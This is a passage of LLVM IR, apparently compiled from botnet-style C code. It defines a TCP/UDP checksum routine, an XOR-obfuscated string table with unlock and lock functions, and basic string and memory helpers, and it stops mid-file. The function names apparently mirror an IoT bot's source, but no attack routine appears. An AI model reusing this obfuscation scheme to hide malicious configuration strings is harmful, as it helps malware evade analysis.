define zeroext i16 @checksum_tcpudp(%struct.iphdr* nocapture readonly, i8* nocapture readonly, i16 zeroext, i32) local_unnamed_addr #7 {
  %5 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %8 = load i32, i32* %7, align 4
  %9 = icmp sgt i32 %3, 1
  br i1 %9, label %.lr.ph33.preheader, label %._crit_edge34

.lr.ph33.preheader:                               ; preds = %4
  %10 = bitcast i8* %1 to i16*
  %11 = add i32 %3, -2
  %12 = lshr i32 %11, 1
  %13 = shl nuw i32 %12, 1
  %14 = zext i32 %13 to i64
  %15 = add nuw nsw i64 %14, 2
  %scevgep = getelementptr i8, i8* %1, i64 %15
  %16 = shl nuw i32 %12, 1
  %17 = add i32 %3, -2
  %18 = lshr i32 %17, 1
  %addconv = add nuw i32 %18, 1
  %min.iters.check = icmp ult i32 %addconv, 8
  br i1 %min.iters.check, label %.lr.ph33.preheader53, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph33.preheader
  %19 = zext i32 %addconv to i64
  %20 = and i32 %addconv, 7
  %n.mod.vf = zext i32 %20 to i64
  %n.vec = sub nsw i64 %19, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %21 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %3, %21
  %ind.end45 = getelementptr i16, i16* %10, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph33.preheader53, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <4 x i32> [ %27, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi47 = phi <4 x i32> [ %28, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %10, i64 %index
  %22 = bitcast i16* %next.gep to <4 x i16>*
  %wide.load = load <4 x i16>, <4 x i16>* %22, align 2
  %23 = getelementptr i16, i16* %next.gep, i64 4
  %24 = bitcast i16* %23 to <4 x i16>*
  %wide.load49 = load <4 x i16>, <4 x i16>* %24, align 2
  %25 = zext <4 x i16> %wide.load to <4 x i32>
  %26 = zext <4 x i16> %wide.load49 to <4 x i32>
  %27 = add <4 x i32> %25, %vec.phi
  %28 = add <4 x i32> %26, %vec.phi47
  %index.next = add i64 %index, 8
  %29 = icmp eq i64 %index.next, %n.vec
  br i1 %29, label %middle.block, label %vector.body, !llvm.loop !8

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <4 x i32> %28, %27
  %rdx.shuf = shufflevector <4 x i32> %bin.rdx, <4 x i32> undef, <4 x i32> <i32 2, i32 3, i32 undef, i32 undef>
  %bin.rdx50 = add <4 x i32> %bin.rdx, %rdx.shuf
  %rdx.shuf51 = shufflevector <4 x i32> %bin.rdx50, <4 x i32> undef, <4 x i32> <i32 1, i32 undef, i32 undef, i32 undef>
  %bin.rdx52 = add <4 x i32> %bin.rdx50, %rdx.shuf51
  %30 = extractelement <4 x i32> %bin.rdx52, i32 0
  %cmp.n = icmp eq i32 %20, 0
  br i1 %cmp.n, label %._crit_edge34.loopexit, label %.lr.ph33.preheader53

.lr.ph33.preheader53:                             ; preds = %middle.block, %min.iters.checked, %.lr.ph33.preheader
  %.031.ph = phi i32 [ %3, %min.iters.checked ], [ %3, %.lr.ph33.preheader ], [ %ind.end, %middle.block ]
  %.02630.ph = phi i32 [ 0, %min.iters.checked ], [ 0, %.lr.ph33.preheader ], [ %30, %middle.block ]
  %.02729.ph = phi i16* [ %10, %min.iters.checked ], [ %10, %.lr.ph33.preheader ], [ %ind.end45, %middle.block ]
  br label %.lr.ph33

.lr.ph33:                                         ; preds = %.lr.ph33.preheader53, %.lr.ph33
  %.031 = phi i32 [ %35, %.lr.ph33 ], [ %.031.ph, %.lr.ph33.preheader53 ]
  %.02630 = phi i32 [ %33, %.lr.ph33 ], [ %.02630.ph, %.lr.ph33.preheader53 ]
  %.02729 = phi i16* [ %34, %.lr.ph33 ], [ %.02729.ph, %.lr.ph33.preheader53 ]
  %31 = load i16, i16* %.02729, align 2
  %32 = zext i16 %31 to i32
  %33 = add i32 %32, %.02630
  %34 = getelementptr inbounds i16, i16* %.02729, i64 1
  %35 = add nsw i32 %.031, -2
  %36 = icmp sgt i32 %35, 1
  br i1 %36, label %.lr.ph33, label %._crit_edge34.loopexit.loopexit, !llvm.loop !9

._crit_edge34.loopexit.loopexit:                  ; preds = %.lr.ph33
  br label %._crit_edge34.loopexit

._crit_edge34.loopexit:                           ; preds = %._crit_edge34.loopexit.loopexit, %middle.block
  %.lcssa43 = phi i32 [ %30, %middle.block ], [ %33, %._crit_edge34.loopexit.loopexit ]
  %37 = sub i32 %11, %16
  br label %._crit_edge34

._crit_edge34:                                    ; preds = %._crit_edge34.loopexit, %4
  %38 = phi i8* [ %1, %4 ], [ %scevgep, %._crit_edge34.loopexit ]
  %.026.lcssa = phi i32 [ 0, %4 ], [ %.lcssa43, %._crit_edge34.loopexit ]
  %.0.lcssa = phi i32 [ %3, %4 ], [ %37, %._crit_edge34.loopexit ]
  %39 = icmp eq i32 %.0.lcssa, 1
  br i1 %39, label %40, label %44

; <label>:40:                                     ; preds = %._crit_edge34
  %41 = load i8, i8* %38, align 1
  %42 = zext i8 %41 to i32
  %43 = add i32 %42, %.026.lcssa
  br label %44

; <label>:44:                                     ; preds = %40, %._crit_edge34
  %.1 = phi i32 [ %43, %40 ], [ %.026.lcssa, %._crit_edge34 ]
  %45 = lshr i32 %6, 16
  %46 = and i32 %6, 65535
  %47 = lshr i32 %8, 16
  %48 = and i32 %8, 65535
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  %50 = load i8, i8* %49, align 1
  %51 = zext i8 %50 to i16
  %52 = tail call zeroext i16 @htons(i16 zeroext %51) #11
  %53 = zext i16 %52 to i32
  %54 = zext i16 %2 to i32
  %55 = add nuw nsw i32 %45, %54
  %56 = add nuw nsw i32 %55, %46
  %57 = add nuw nsw i32 %56, %47
  %58 = add nuw nsw i32 %57, %48
  %59 = add i32 %58, %.1
  %60 = add i32 %59, %53
  %61 = lshr i32 %60, 16
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %44
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %63 = phi i32 [ %66, %.lr.ph ], [ %61, %.lr.ph.preheader ]
  %.228 = phi i32 [ %65, %.lr.ph ], [ %60, %.lr.ph.preheader ]
  %64 = and i32 %.228, 65535
  %65 = add nuw nsw i32 %64, %63
  %66 = lshr i32 %65, 16
  %67 = icmp eq i32 %66, 0
  br i1 %67, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %44
  %.2.lcssa = phi i32 [ %60, %44 ], [ %65, %._crit_edge.loopexit ]
  %68 = trunc i32 %.2.lcssa to i16
  %69 = xor i16 %68, -1
  ret i16 %69
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i32 @rand_next() local_unnamed_addr #8 {
  ret i32 0
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alphastr(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = alloca [32 x i8], align 16
  tail call void @table_unlock_val(i8 zeroext 61)
  %4 = getelementptr inbounds [32 x i8], [32 x i8]* %3, i64 0, i64 0
  %5 = tail call i8* @table_retrieve_val(i32 61, i32* null)
  %6 = call i8* @strcpy(i8* nonnull %4, i8* %5) #10
  %7 = icmp eq i32 %1, 0
  br i1 %7, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %2
  %8 = load i8, i8* %4, align 16
  %9 = add i32 %1, -1
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %10, 1
  call void @llvm.memset.p0i8.i64(i8* %0, i8 %8, i64 %11, i32 1, i1 false)
  br label %._crit_edge

._crit_edge:                                      ; preds = %.lr.ph, %2
  call void @table_lock_val(i8 zeroext 61)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_unlock_val(i8 zeroext) local_unnamed_addr #9 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc void @toggle_obf(i8 zeroext) unnamed_addr #9 {
  %2 = zext i8 %0 to i64
  %3 = load i32, i32* @table_key, align 4
  %4 = lshr i32 %3, 8
  %5 = lshr i32 %3, 16
  %6 = lshr i32 %3, 24
  %7 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %2, i32 1
  %8 = load i16, i16* %7, align 8
  %9 = icmp eq i16 %8, 0
  br i1 %9, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %1
  %10 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %2, i32 0
  br label %11

; <label>:11:                                     ; preds = %.lr.ph, %11
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %11 ]
  %12 = load i8*, i8** %10, align 16
  %13 = getelementptr inbounds i8, i8* %12, i64 %indvars.iv
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = xor i32 %15, %3
  %17 = trunc i32 %16 to i8
  store i8 %17, i8* %13, align 1
  %18 = load i8*, i8** %10, align 16
  %19 = getelementptr inbounds i8, i8* %18, i64 %indvars.iv
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = xor i32 %21, %4
  %23 = trunc i32 %22 to i8
  store i8 %23, i8* %19, align 1
  %24 = load i8*, i8** %10, align 16
  %25 = getelementptr inbounds i8, i8* %24, i64 %indvars.iv
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = xor i32 %27, %5
  %29 = trunc i32 %28 to i8
  store i8 %29, i8* %25, align 1
  %30 = load i8*, i8** %10, align 16
  %31 = getelementptr inbounds i8, i8* %30, i64 %indvars.iv
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = xor i32 %33, %6
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %31, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %36 = load i16, i16* %7, align 8
  %37 = zext i16 %36 to i64
  %38 = icmp slt i64 %indvars.iv.next, %37
  br i1 %38, label %11, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %11
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_lock_val(i8 zeroext) local_unnamed_addr #9 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) local_unnamed_addr #9 {
  %3 = sext i32 %0 to i64
  %4 = icmp eq i32* %1, null
  br i1 %4, label %9, label %5

; <label>:5:                                      ; preds = %2
  %6 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %3, i32 1
  %7 = load i16, i16* %6, align 8
  %8 = zext i16 %7 to i32
  store i32 %8, i32* %1, align 4
  br label %9

; <label>:9:                                      ; preds = %2, %5
  %10 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %3, i32 0
  %11 = load i8*, i8** %10, align 16
  ret i8* %11
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @util_strlen(i8* nocapture readonly) local_unnamed_addr #4 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.03 = phi i32 [ %5, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i8* [ %4, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %4 = getelementptr inbounds i8, i8* %.012, i64 1
  %5 = add nuw nsw i32 %.03, 1
  %6 = load i8, i8* %4, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.0.lcssa = phi i32 [ 0, %1 ], [ %5, %._crit_edge.loopexit ]
  ret i32 %.0.lcssa
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define signext i8 @util_strncmp(i8* nocapture readonly, i8* nocapture readonly, i32) local_unnamed_addr #4 {
  %4 = tail call i32 @util_strlen(i8* %0)
  %5 = tail call i32 @util_strlen(i8* %1)
  %6 = icmp slt i32 %4, %2
  %7 = icmp slt i32 %5, %2
  %or.cond = or i1 %6, %7
  br i1 %or.cond, label %.loopexit, label %.preheader.preheader

.preheader.preheader:                             ; preds = %3
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %9
  %.011 = phi i8* [ %13, %9 ], [ %1, %.preheader.preheader ]
  %.010 = phi i32 [ %10, %9 ], [ %2, %.preheader.preheader ]
  %.09 = phi i8* [ %11, %9 ], [ %0, %.preheader.preheader ]
  %8 = icmp eq i32 %.010, 0
  br i1 %8, label %.loopexit.loopexit, label %9

; <label>:9:                                      ; preds = %.preheader
  %10 = add nsw i32 %.010, -1
  %11 = getelementptr inbounds i8, i8* %.09, i64 1
  %12 = load i8, i8* %.09, align 1
  %13 = getelementptr inbounds i8, i8* %.011, i64 1
  %14 = load i8, i8* %.011, align 1
  %15 = icmp eq i8 %12, %14
  br i1 %15, label %.preheader, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %9, %.preheader
  %.0.ph = phi i8 [ 1, %.preheader ], [ 0, %9 ]
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %3
  %.0 = phi i8 [ 0, %3 ], [ %.0.ph, %.loopexit.loopexit ]
  ret i8 %.0
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define signext i8 @util_strcmp(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #4 {
  %3 = tail call i32 @util_strlen(i8* %0)
  %4 = tail call i32 @util_strlen(i8* %1)
  %5 = icmp eq i32 %3, %4
  br i1 %5, label %.preheader.preheader, label %.loopexit

.preheader.preheader:                             ; preds = %2
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %7
  %.09 = phi i8* [ %9, %7 ], [ %0, %.preheader.preheader ]
  %.08 = phi i8* [ %11, %7 ], [ %1, %.preheader.preheader ]
  %.07 = phi i32 [ %8, %7 ], [ %3, %.preheader.preheader ]
  %6 = icmp eq i32 %.07, 0
  br i1 %6, label %.loopexit.loopexit, label %7

; <label>:7:                                      ; preds = %.preheader
  %8 = add nsw i32 %.07, -1
  %9 = getelementptr inbounds i8, i8* %.09, i64 1
  %10 = load i8, i8* %.09, align 1
  %11 = getelementptr inbounds i8, i8* %.08, i64 1
  %12 = load i8, i8* %.08, align 1
  %13 = icmp eq i8 %10, %12
  br i1 %13, label %.preheader, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %7, %.preheader
  %.0.ph = phi i8 [ 1, %.preheader ], [ 0, %7 ]
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %2
  %.0 = phi i8 [ 0, %2 ], [ %.0.ph, %.loopexit.loopexit ]
  ret i8 %.0
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @util_strcpy(i8* nocapture, i8* nocapture readonly) local_unnamed_addr #9 {
  %3 = tail call i32 @util_strlen(i8* %1)
  %4 = add nsw i32 %3, 1
  tail call void @util_memcpy(i8* %0, i8* %1, i32 %4)
  ret i32 %3
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @util_memcpy(i8* nocapture, i8* nocapture readonly, i32) local_unnamed_addr #9 {
  %4 = icmp eq i32 %2, 0
  br i1 %4, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %3
  %5 = add i32 %2, -1
  %6 = zext i32 %5 to i64
  %7 = add nuw nsw i64 %6, 1
  %min.iters.check = icmp ult i64 %7, 32
  br i1 %min.iters.check, label %.lr.ph.preheader19, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph.preheader
  %n.vec = and i64 %7, 8589934560
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %.lr.ph.preheader19, label %vector.memcheck

vector.memcheck:                                  ; preds = %min.iters.checked
  %8 = add i32 %2, -1
  %9 = zext i32 %8 to i64
  %10 = add nuw nsw i64 %9, 1
  %scevgep = getelementptr i8, i8* %0, i64 %10
  %scevgep9 = getelementptr i8, i8* %1, i64 %10
  %bound0 = icmp ugt i8* %scevgep9, %0
  %bound1 = icmp ugt i8* %scevgep, %1
  %memcheck.conflict = and i1 %bound0, %bound1
  %ind.end = getelementptr i8, i8* %1, i64 %n.vec
  %ind.end11 = getelementptr i8, i8* %0, i64 %n.vec
  %cast.crd = trunc i64 %n.vec to i32
  %ind.end13 = sub i32 %2, %cast.crd
  br i1 %memcheck.conflict, label %.lr.ph.preheader19, label %vector.body.preheader

vector.body.preheader:                            ; preds = %vector.memcheck
  %11 = add nsw i64 %n.vec, -32
  %12 = lshr exact i64 %11, 5
  %13 = add nuw nsw i64 %12, 1
  %xtraiter20 = and i64 %13, 3
  %lcmp.mod21 = icmp eq i64 %xtraiter20, 0
  br i1 %lcmp.mod21, label %vector.body.prol.loopexit, label %vector.body.prol.preheader

vector.body.prol.preheader:                       ; preds = %vector.body.preheader
  br label %vector.body.prol

vector.body.prol:                                 ; preds = %vector.body.prol, %vector.body.prol.preheader
  %index.prol = phi i64 [ %index.next.prol, %vector.body.prol ], [ 0, %vector.body.prol.preheader ]
  %prol.iter22 = phi i64 [ %prol.iter22.sub, %vector.body.prol ], [ %xtraiter20, %vector.body.prol.preheader ]
  %next.gep.prol = getelementptr i8, i8* %1, i64 %index.prol
  %next.gep15.prol = getelementptr i8, i8* %0, i64 %index.prol
  %14 = bitcast i8* %next.gep.prol to <16 x i8>*
  %wide.load.prol = load <16 x i8>, <16 x i8>* %14, align 1, !alias.scope !10
  %15 = getelementptr i8, i8* %next.gep.prol, i64 16
  %16 = bitcast i8* %15 to <16 x i8>*
  %wide.load18.prol = load <16 x i8>, <16 x i8>* %16, align 1, !alias.scope !10
  %17 = bitcast i8* %next.gep15.prol to <16 x i8>*
  store <16 x i8> %wide.load.prol, <16 x i8>* %17, align 1, !alias.scope !13, !noalias !10
  %18 = getelementptr i8, i8* %next.gep15.prol, i64 16
  %19 = bitcast i8* %18 to <16 x i8>*
  store <16 x i8> %wide.load18.prol, <16 x i8>* %19, align 1, !alias.scope !13, !noalias !10
  %index.next.prol = add i64 %index.prol, 32
  %prol.iter22.sub = add i64 %prol.iter22, -1
  %prol.iter22.cmp = icmp eq i64 %prol.iter22.sub, 0
  br i1 %prol.iter22.cmp, label %vector.body.prol.loopexit.unr-lcssa, label %vector.body.prol, !llvm.loop !15

vector.body.prol.loopexit.unr-lcssa:              ; preds = %vector.body.prol
  br label %vector.body.prol.loopexit

vector.body.prol.loopexit:                        ; preds = %vector.body.preheader, %vector.body.prol.loopexit.unr-lcssa
  %index.unr = phi i64 [ 0, %vector.body.preheader ], [ %index.next.prol, %vector.body.prol.loopexit.unr-lcssa ]
  %20 = icmp ult i64 %11, 96
  br i1 %20, label %middle.block, label %vector.body.preheader.new

vector.body.preheader.new:                        ; preds = %vector.body.prol.loopexit
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %vector.body.preheader.new
  %index = phi i64 [ %index.unr, %vector.body.preheader.new ], [ %index.next.3, %vector.body ]
  %next.gep = getelementptr i8, i8* %1, i64 %index
  %next.gep15 = getelementptr i8, i8* %0, i64 %index
  %21 = bitcast i8* %next.gep to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %21, align 1, !alias.scope !10
  %22 = getelementptr i8, i8* %next.gep, i64 16
  %23 = bitcast i8* %22 to <16 x i8>*
  %wide.load18 = load <16 x i8>, <16 x i8>* %23, align 1, !alias.scope !10
  %24 = bitcast i8* %next.gep15 to <16 x i8>*
  store <16 x i8> %wide.load, <16 x i8>* %24, align 1, !alias.scope !13, !noalias !10
  %25 = getelementptr i8, i8* %next.gep15, i64 16
  %26 = bitcast i8* %25 to <16 x i8>*
  store <16 x i8> %wide.load18, <16 x i8>* %26, align 1, !alias.scope !13, !noalias !10
  %index.next = add i64 %index, 32
  %next.gep.1 = getelementptr i8, i8* %1, i64 %index.next
  %next.gep15.1 = getelementptr i8, i8* %0, i64 %index.next
  %27 = bitcast i8* %next.gep.1 to <16 x i8>*
  %wide.load.1 = load <16 x i8>, <16 x i8>* %27, align 1, !alias.scope !10
  %28 = getelementptr i8, i8* %next.gep.1, i64 16
  %29 = bitcast i8* %28 to <16 x i8>*
  %wide.load18.1 = load <16 x i8>, <16 x i8>* %29, align 1, !alias.scope !10
  %30 = bitcast i8* %next.gep15.1 to <16 x i8>*
  store <16 x i8> %wide.load.1, <16 x i8>* %30, align 1, !alias.scope !13, !noalias !10
  %31 = getelementptr i8, i8* %next.gep15.1, i64 16
  %32 = bitcast i8* %31 to <16 x i8>*
  store <16 x i8> %wide.load18.1, <16 x i8>* %32, align 1, !alias.scope !13, !noalias !10
  %index.next.1 = add i64 %index, 64
  %next.gep.2 = getelementptr i8, i8* %1, i64 %index.next.1
  %next.gep15.2 = getelementptr i8, i8* %0, i64 %index.next.1
  %33 = bitcast i8* %next.gep.2 to <16 x i8>*
  %wide.load.2 = load <16 x i8>, <16 x i8>* %33, align 1, !alias.scope !10
  %34 = getelementptr i8, i8* %next.gep.2, i64 16
  %35 = bitcast i8* %34 to <16 x i8>*
  %wide.load18.2 = load <16 x i8>, <16 x i8>* %35, align 1, !alias.scope !10
  %36 = bitcast i8* %next.gep15.2 to <16 x i8>*
  store <16 x i8> %wide.load.2, <16 x i8>* %36, align 1, !alias.scope !13, !noalias !10
  %37 = getelementptr i8, i8* %next.gep15.2, i64 16
  %38 = bitcast i8* %37 to <16 x i8>*
  store <16 x i8> %wide.load18.2, <16 x i8>* %38, align 1, !alias.scope !13, !noalias !10
  %index.next.2 = add i64 %index, 96
  %next.gep.3 = getelementptr i8, i8* %1, i64 %index.next.2
  %next.gep15.3 = getelementptr i8, i8* %0, i64 %index.next.2
  %39 = bitcast i8* %next.gep.3 to <16 x i8>*
  %wide.load.3 = load <16 x i8>, <16 x i8>* %39, align 1, !alias.scope !10
  %40 = getelementptr i8, i8* %next.gep.3, i64 16
  %41 = bitcast i8* %40 to <16 x i8>*
  %wide.load18.3 = load <16 x i8>, <16 x i8>* %41, align 1, !alias.scope !10
  %42 = bitcast i8* %next.gep15.3 to <16 x i8>*
  store <16 x i8> %wide.load.3, <16 x i8>* %42, align 1, !alias.scope !13, !noalias !10
  %43 = getelementptr i8, i8* %next.gep15.3, i64 16
  %44 = bitcast i8* %43 to <16 x i8>*
  store <16 x i8> %wide.load18.3, <16 x i8>* %44, align 1, !alias.scope !13, !noalias !10
  %index.next.3 = add i64 %index, 128
  %45 = icmp eq i64 %index.next.3, %n.vec
  br i1 %45, label %middle.block.unr-lcssa, label %vector.body, !llvm.loop !17

middle.block.unr-lcssa:                           ; preds = %vector.body
  br label %middle.block

middle.block:                                     ; preds = %vector.body.prol.loopexit, %middle.block.unr-lcssa
  %cmp.n = icmp eq i64 %7, %n.vec
  br i1 %cmp.n, label %._crit_edge, label %.lr.ph.preheader19

.lr.ph.preheader19:                               ; preds = %middle.block, %vector.memcheck, %min.iters.checked, %.lr.ph.preheader
  %.08.ph = phi i8* [ %1, %vector.memcheck ], [ %1, %min.iters.checked ], [ %1, %.lr.ph.preheader ], [ %ind.end, %middle.block ]
  %.047.ph = phi i8* [ %0, %vector.memcheck ], [ %0, %min.iters.checked ], [ %0, %.lr.ph.preheader ], [ %ind.end11, %middle.block ]
  %.056.ph = phi i32 [ %2, %vector.memcheck ], [ %2, %min.iters.checked ], [ %2, %.lr.ph.preheader ], [ %ind.end13, %middle.block ]
  %46 = add i32 %.056.ph, -1
  %xtraiter = and i32 %.056.ph, 7
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph.prol.loopexit, label %.lr.ph.prol.preheader

.lr.ph.prol.preheader:                            ; preds = %.lr.ph.preheader19
  br label %.lr.ph.prol

.lr.ph.prol:                                      ; preds = %.lr.ph.prol, %.lr.ph.prol.preheader
  %.08.prol = phi i8* [ %48, %.lr.ph.prol ], [ %.08.ph, %.lr.ph.prol.preheader ]
  %.047.prol = phi i8* [ %50, %.lr.ph.prol ], [ %.047.ph, %.lr.ph.prol.preheader ]
  %.056.prol = phi i32 [ %47, %.lr.ph.prol ], [ %.056.ph, %.lr.ph.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph.prol ], [ %xtraiter, %.lr.ph.prol.preheader ]
  %47 = add nsw i32 %.056.prol, -1
  %48 = getelementptr inbounds i8, i8* %.08.prol, i64 1
  %49 = load i8, i8* %.08.prol, align 1
  %50 = getelementptr inbounds i8, i8* %.047.prol, i64 1
  store i8 %49, i8* %.047.prol, align 1
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph.prol.loopexit.unr-lcssa, label %.lr.ph.prol, !llvm.loop !18

.lr.ph.prol.loopexit.unr-lcssa:                   ; preds = %.lr.ph.prol
  br label %.lr.ph.prol.loopexit

.lr.ph.prol.loopexit:                             ; preds = %.lr.ph.preheader19, %.lr.ph.prol.loopexit.unr-lcssa
  %.08.unr = phi i8* [ %.08.ph, %.lr.ph.preheader19 ], [ %48, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.047.unr = phi i8* [ %.047.ph, %.lr.ph.preheader19 ], [ %50, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.056.unr = phi i32 [ %.056.ph, %.lr.ph.preheader19 ], [ %47, %.lr.ph.prol.loopexit.unr-lcssa ]
  %51 = icmp ult i32 %46, 7
  br i1 %51, label %._crit_edge.loopexit, label %.lr.ph.preheader19.new

.lr.ph.preheader19.new:                           ; preds = %.lr.ph.prol.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph, %.lr.ph.preheader19.new
  %.08 = phi i8* [ %.08.unr, %.lr.ph.preheader19.new ], [ %74, %.lr.ph ]
  %.047 = phi i8* [ %.047.unr, %.lr.ph.preheader19.new ], [ %76, %.lr.ph ]
  %.056 = phi i32 [ %.056.unr, %.lr.ph.preheader19.new ], [ %73, %.lr.ph ]
  %52 = getelementptr inbounds i8, i8* %.08, i64 1
  %53 = load i8, i8* %.08, align 1
  %54 = getelementptr inbounds i8, i8* %.047, i64 1
  store i8 %53, i8* %.047, align 1
  %55 = getelementptr inbounds i8, i8* %.08, i64 2
  %56 = load i8, i8* %52, align 1
  %57 = getelementptr inbounds i8, i8* %.047, i64 2
  store i8 %56, i8* %54, align 1
  %58 = getelementptr inbounds i8, i8* %.08, i64 3
  %59 = load i8, i8* %55, align 1
  %60 = getelementptr inbounds i8, i8* %.047, i64 3
  store i8 %59, i8* %57, align 1
  %61 = getelementptr inbounds i8, i8* %.08, i64 4
  %62 = load i8, i8* %58, align 1
  %63 = getelementptr inbounds i8, i8* %.047, i64 4
  store i8 %62, i8* %60, align 1
  %64 = getelementptr inbounds i8, i8* %.08, i64 5
  %65 = load i8, i8* %61, align 1
  %66 = getelementptr inbounds i8, i8* %.047, i64 5
  store i8 %65, i8* %63, align 1
  %67 = getelementptr inbounds i8, i8* %.08, i64 6
  %68 = load i8, i8* %64, align 1
  %69 = getelementptr inbounds i8, i8* %.047, i64 6
  store i8 %68, i8* %66, align 1
  %70 = getelementptr inbounds i8, i8* %.08, i64 7
  %71 = load i8, i8* %67, align 1
  %72 = getelementptr inbounds i8, i8* %.047, i64 7
  store i8 %71, i8* %69, align 1
  %73 = add nsw i32 %.056, -8
  %74 = getelementptr inbounds i8, i8* %.08, i64 8
  %75 = load i8, i8* %70, align 1
  %76 = getelementptr inbounds i8, i8* %.047, i64 8
  store i8 %75, i8* %72, align 1
  %77 = icmp eq i32 %73, 0
  br i1 %77, label %._crit_edge.loopexit.unr-lcssa, label %.lr.ph, !llvm.loop !19

._crit_edge.loopexit.unr-lcssa:                   ; preds = %.lr.ph
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph.prol.loopexit, %._crit_edge.loopexit.unr-lcssa
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %middle.block, %3
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @util_zero(i8* nocapture, i32) local_unnamed_addr #9 {
  %3 = icmp eq i32 %1, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %2
  %4 = add i32 %1, -1
  %5 = zext i32 %4 to i64
  %6 = add nuw nsw i64 %5, 1
  call void @llvm.memset.p0i8.i64(i8* %0, i8 0, i64 %6, i32 1, i1 false)
  br label %._crit_edge

._crit_edge:                                      ; preds = %.lr.ph.preheader, %2
  ret void
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
